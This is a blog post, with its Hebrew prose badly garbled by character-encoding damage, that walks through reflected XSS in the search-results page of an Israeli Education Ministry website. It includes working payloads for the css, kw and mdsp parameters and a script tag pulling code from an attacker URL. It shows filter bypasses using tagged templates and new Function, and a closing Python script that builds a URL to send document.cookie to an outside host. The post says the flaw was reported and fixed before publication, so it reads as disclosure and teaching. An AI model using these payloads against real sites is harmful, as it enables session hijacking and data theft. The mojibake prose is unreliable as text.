---
layout: post
title: 转专 砖专  - reflected xss
tags: [web, xss]
---
 砖 转专 专 砖 砖专   注专转 砖 驻砖 转, 转 拽专 转 注专转 住转 驻砖  砖转.

转专     转专  转 注专转  转专 砖注 注  住专:
```
http://cms.education.gov.il/educationcms/units/avodotgemer/default.htm
```
<!--more-->

![]({{ site.baseurl }}/assets/gov-xss/site-view.png)


转 专转 爪  砖 转专 砖 驻砖

![]({{ site.baseurl }}/assets/gov-xss/search-bar.png)

转 砖 拽 转 驻砖  `xss`, 转 驻砖 转  `test`, 爪转 专 专  注专转 祝 转爪转

```
http://cms.education.gov.il/EducationCMS/Units/AvodotGemer/SearchResultsPages/SearchResults.htm?kw=test&mdsp=&css=/EducationCMS/UNITS/AvodotGemer/Css/Styles.css
```

转 专转 砖专  转爪转 爪转  注爪 iframe

![]({{ site.baseurl }}/assets/gov-xss/its-iframe.png)

住 转转 砖转  iframe 注 转 驻砖专  拽专 转 注专转 爪专 专专 转专

```
http://cms.education.gov.il/SearchResults/SearchResultsPage.aspx?kw=test&mdsp=&css=/EducationCMS/UNITS/AvodotGemer/Css/Styles.css
```

转   转 专 转专  注专 砖注专 驻专专 砖 转转 砖转 注  砖转砖

### 驻专专 `css` 专 注 转 转 import  拽抓 css

![]({{ site.baseurl }}/assets/gov-xss/css-link.png)

转 住转 专拽 拽 专 驻专专  拽转 砖砖专转  住 转 转

```
http://cms.education.gov.il/SearchResults/SearchResultsPage.aspx?kw=.&css='><script src="http://{ATTACKER_URL}/code.js"></script>
```

爪注专  `xss auditor` 拽驻抓 住 转 住 专拽 砖 拽

![]({{ site.baseurl }}/assets/gov-xss/css-xss-auditor.png)

转 砖住转 注拽祝 转  `xss auditor`  转专   砖转 ...

### 砖专 住 注专 驻专专 `kw`  驻注 拽 拽专 砖 祝 注专 砖 砖转 `javascript`

![]({{ site.baseurl }}/assets/gov-xss/searchword.png)

 住转 专拽 拽 `javascript`  注  住 驻砖 住转 转 :

```js
'; alert(1)//
```
转专 拽 砖爪转 专 爪转  , 拽专 驻注 `alert` 住 转 砖专 拽 转  

```javascript
var searchKeyword = '';alert(1)//';
```

爪注专    砖拽专 驻 砖专转 住 转 注 转 爪转   专抓 拽  砖砖专 转 注 驻砖专转   砖 

### 注专 驻专专 `mdsp` 转专 砖转 `javascript`

 砖转 `kw` 注专 `mdsp` 专 注 砖转 拽  `javascript`  驻注 住 转.

![]({{ site.baseurl }}/assets/gov-xss/mdsp-param.png)

转 专转 砖专 驻 转 砖 砖专 转   住 专转 砖专  爪转 转 住转 专抓 拽  
住 驻专专 转 注专 :
```
%0Ax=1;
```
* `%0A = \n = new line`

转砖  砖专转 转 转 拽 :

```js
// http://cms.education.gov.il/SearchResults/SearchResultsPage.aspx?kw=.&mdsp=%0Ax=1

<script language="javascript" type="text/javascript">
    <!-- 
    var searchKeyword = '.';
    var searchMetaData = '';//'
    x=1'; 
    -->
</script>
```

转   专转 砖专  注   `x=1` 拽 拽   拽专  拽 砖转 转专  砖砖  转 砖专转  砖砖专转 住祝 专 拽 砖 (`';`)  
转 驻转专 注  注  住驻转 转 专 拽 砖,  砖  爪专  砖转 转专:

```js
var searchMetaData = '';//'
x=1//';
```

注砖  注 砖砖  驻爪 专拽转 拽  住转 驻转 转专 注 注专 :

```
%0Aconsole.log('xss')//
```

转专 注  专爪转 拽  驻 `xss` 驻住  `console` 驻驻 砖,  拽专 砖 砖专转 住 转    注.  
专  拽转 注转 住拽 砖转 砖砖专转 住 :

```js
( ) " '
```

  注拽祝 转  ?

砖驻转  `javascript` 专转 砖   驻爪'专 ,    `Template literals` 转 `Tagged Templates`

* `Tagged Templates` - 驻砖专  砖转砖 转转 (`Template String`) 注专 驻拽爪 住转

砖砖  `Tagged Templates`  驻砖专  拽专 驻注  住专 住住,  砖转  转 驻爪 爪注 转 专  拽 拽专 转拽 驻注, :

```js
alert`Hello World`
```

 砖转砖 砖  转 `payload` 转:

```
%0Aalert`xss by amit`//
```

住 转 注专 驻专专 驻转注 ! 拽 `alert`

![]({{ site.baseurl }}/assets/gov-xss/xss-alert.png)

###   专爪 专抓 拽  专拽 拽驻抓 转专转 !

砖 专砖 砖注转  专砖  砖砖  `Tagged Templates`, `eval` `string escaping` 驻砖

* 砖砖  `string escaping` 驻砖专  注拽祝 转 驻专 砖 转  砖爪专驻  驻专砖 拽专 砖 砖专 爪 转 住专

 砖砖砖  `Tagged Templates` 注专 转 驻专专 驻拽爪 拽砖转 拽 注专, 驻注 `eval`  转注  爪专 砖 注 砖 专转 爪注 专爪转 拽

```js
eval`alert\x28document.domain\x29;`

// same as: eval([`alert\x28document.domain\x29;`])
```

* `\x28` = `(`, `\x29` = `)`

 砖转砖 驻注 `Function` 拽转 住专 / 注专 爪专转  驻注 砖

```js
new Function`alert\x28document.domain\x29;`

// same as: Function([`alert\x28document.domain\x29;`])
// output will be
//  anonymous() {
//     alert(document.domain);
// }
```

注 转  转 驻注 砖 拽 爪专 驻爪 转 砖 拽:
* 拽 专砖  驻注 `Function` 拽转 住专 注专  专 驻拽爪
* 驻专专 `new` 砖专 爪注 拽专 驻注

注砖 专拽 砖专 拽 砖 转 拽 转专  转  转转  驻注 注  砖砖  `payload`:

```
%0Anew Function`alert\x28document.domain\x29;`//
```

住 转转:

```
http://cms.education.gov.il/SearchResults/SearchResultsPage.aspx?kw=.&mdsp=%0Anew Function`alert\x28document.domain\x29;`//
```

注 ! 注 

![]({{ site.baseurl }}/assets/gov-xss/final-xss.png)

 砖拽专转 转 注 转转 注爪 住拽专驻 拽 注 注:

```py
from urllib.parse import urlencode
from jsmin import jsmin

# minifying and escaping payload
payload = jsmin('''
alert(document.domain);
fetch('http://localhost:3000', {
    method: 'POST',
    body: document.cookie
})
''').replace('(', r'\x28').replace(')', r'\x29').replace('\'', r'\`')

# create a query string
params = urlencode({
    'kw': '.',
    'mdsp': f'\nnew Function`{payload}`//'
})

# append the query string to the vulnerable site
print(f'http://cms.education.gov.il/SearchResults/SearchResultsPage.aspx?{params}')
```

* 注  砖专  (转 拽转 砖专 拽专 转 注专转 转) 专 砖 住 砖转  转 驻专住 转 驻住 ". (驻专住  25/11/2019)